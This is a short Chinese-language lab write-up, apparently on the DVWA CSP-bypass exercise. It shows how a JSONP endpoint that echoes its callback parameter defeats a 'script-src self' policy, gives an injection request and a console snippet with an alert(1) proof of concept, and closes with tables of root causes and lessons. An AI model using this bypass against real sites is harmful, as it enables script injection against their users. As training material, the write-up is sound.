## CSP

```http
script-src 'self'
```

只能执行本站的 JS。

## 漏洞点：jsonp.php

```php
$callback = $_GET['callback'];        // 用户可控
echo $callback . "(" . json_encode($outp) . ")";  // 直接拼成 JS
```

访问 `source/jsonp.php?callback=alert(1)` → 输出 `alert(1)(...)` → 浏览器当 JS 执行。

## 为什么 CSP 拦不住

`source/jsonp.php` 就在本站 —— `'self'` 白名单放行。

## 利用

POST 参数 `include` 没限制（虽然页面没显示输入框）：

```
POST /vulnerabilities/csp/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

include=<script src="source/jsonp.php?callback=alert(1)"></script>
```

或在 Console 执行：
```javascript
var f=document.forms[0];
var i=document.createElement('input');
i.name='include';
i.value='<script src="source/jsonp.php?callback=alert(1)"><\/script>';
f.appendChild(i);
f.submit();
```

## 根因

| 层 | 问题 |
|------|------|
| jsonp.php | callback 参数直接拼接输出，无过滤 |
| CSP | `'self'` 太宽，本站文件全部放行 |
| 业务 | 隐藏的 POST 参数 `include` 没清掉 |

## 三关对比

| | Low | Medium | High |
|------|------|------|------|
| CSP | 域名白名单，放了攻击者域名 | nonce，但写死在注释 | `'self'`，太宽 |
| 绕过 | 白名单域名有攻击脚本 | nonce 公开可见 | 本站 jsonp 当跳板 |
| 教训 | 白名单不能放不可信域名 | nonce 不能泄露 | `'self'` 不等于安全 |
